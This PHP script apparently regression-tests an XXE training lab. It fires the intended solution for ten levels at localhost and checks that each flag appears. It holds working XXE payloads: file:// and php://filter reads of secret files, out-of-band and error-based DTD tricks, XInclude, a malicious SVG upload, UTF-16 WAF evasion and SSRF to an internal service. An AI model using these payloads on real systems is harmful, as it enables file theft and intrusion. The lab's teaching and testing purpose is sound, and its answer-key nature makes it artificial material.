<?php
/**
 * XXE Lab self-test: runs the intended solution for every level against the
 * live app, so a level that has quietly stopped being solvable is caught.
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * Not part of the challenge - it exists so the lab can be regression-tested.
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

function post(string $url, array $fields): string
{
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($fields),
        'timeout' => 30,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

/** multipart/form-data POST - level 6 is reached through a real file upload. */
function post_upload(string $url, array $fields, string $field, string $filename, string $content, string $type): string
{
    $b    = '----xxecheck' . bin2hex(random_bytes(8));
    $body = '';
    foreach ($fields as $k => $v) {
        $body .= "--$b\r\nContent-Disposition: form-data; name=\"$k\"\r\n\r\n$v\r\n";
    }
    $body .= "--$b\r\nContent-Disposition: form-data; name=\"$field\"; filename=\"$filename\"\r\n"
           . "Content-Type: $type\r\n\r\n$content\r\n--$b--\r\n";
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: multipart/form-data; boundary=$b\r\n",
        'content' => $body,
        'timeout' => 30,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

function check(int $level, string $body, string $note = ''): void
{
    global $pass, $fail;
    $want = get_flag_for_level($level);
    // The page only prints the flag inside the "Flag Captured" panel; the hint
    // text never contains it, so a plain substring test is enough.
    if ($want !== '' && strpos($body, $want) !== false) {
        $pass++;
        printf("  PASS  level %-2d %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    } else {
        $fail++;
        printf("  FAIL  level %-2d expected %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    }
}

// Level 3 is confirmed from the out-of-band collector, which remembers hits for
// 120s. Clear it first so a stale callback from an earlier run cannot make a
// broken level look solved.
@unlink(xxe_collector_path());

echo "XXE Lab self-test\n-----------------\n";

/* 1 - classic external general entity reads a file */
check(1, post("$base/level1.php", ['xml' =>
    "<?xml version=\"1.0\"?>\n" .
    "<!DOCTYPE root [ <!ENTITY xxe SYSTEM \"file:///var/secret/flag1.txt\"> ]>\n" .
    "<order><item>&xxe;</item></order>",
]), 'file:// entity');

/* 2 - php://filter so the PHP source survives XML parsing */
check(2, post("$base/level2.php", ['xml' =>
    "<?xml version=\"1.0\"?>\n" .
    "<!DOCTYPE root [ <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/secret/flag2.php\"> ]>\n" .
    "<order><item>&xxe;</item></order>",
]), 'php://filter base64');

/* 3 - blind: pull in the hosted DTD, which calls back to collector.php */
check(3, post("$base/level3.php", ['xml' =>
    "<?xml version=\"1.0\"?>\n" .
    "<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://127.0.0.1/oob.dtd\">\n  %remote;\n]>\n" .
    "<root>ping</root>",
]), 'out-of-band callback');

/* 4 - error based: the failing load prints the secret in the message */
check(4, post("$base/level4.php", ['xml' =>
    "<?xml version=\"1.0\"?>\n" .
    "<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://127.0.0.1/error.dtd\">\n  %remote;\n]>\n" .
    "<root/>",
]), 'libxml error leak');

/* 5 - DOCTYPE stripped, so use XInclude instead */
check(5, post("$base/level5.php", ['xml' =>
    "<data xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n" .
    "  <xi:include parse=\"text\" href=\"file:///var/secret/flag5.txt\"/>\n" .
    "</data>",
]), 'xi:include parse=text');

/* 6 - the same entity, smuggled in as an uploaded SVG */
$svg = "<?xml version=\"1.0\"?>\n"
     . "<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:///var/secret/flag6.txt\"> ]>\n"
     . "<svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>";
check(6, post_upload("$base/level6.php", [], 'svg', 'logo.svg', $svg, 'image/svg+xml'), 'real .svg upload');

/* 7 - WAF only reads ASCII, so send the document as UTF-16 */
check(7, post("$base/level7.php", [
    'xml' => "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n" .
             "<!DOCTYPE root [ <!ENTITY xxe SYSTEM \"file:///var/secret/flag7.txt\"> ]>\n" .
             "<root>&xxe;</root>",
    'encoding' => 'UTF-16',
]), 'UTF-16 transfer');

/* 8 - parameter-entity chain hosted in an external DTD */
check(8, post("$base/level8.php", ['xml' =>
    "<?xml version=\"1.0\"?>\n" .
    "<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://127.0.0.1/chain.dtd\">\n  %remote;\n]>\n" .
    "<root>&chained;</root>",
]), '%f1 -> %f2 -> &chained;');

/* 9 - the entity URI is an internal-only HTTP service */
check(9, post("$base/level9.php", ['xml' =>
    "<?xml version=\"1.0\"?>\n" .
    "<!DOCTYPE root [ <!ENTITY xxe SYSTEM \"http://127.0.0.1/internal.php\"> ]>\n" .
    "<root>&xxe;</root>",
]), 'SSRF to 127.0.0.1');

/* 10 - one encoding trick blinds all three ASCII filters at once */
check(10, post("$base/level10.php", [
    'xml' => "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n" .
             "<!DOCTYPE root [ <!ENTITY xxe SYSTEM \"file:///var/secret/flag10.txt\"> ]>\n" .
             "<root>&xxe;</root>",
    'encoding' => 'UTF-16',
]), 'UTF-16 past 3 layers');

echo "-----------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
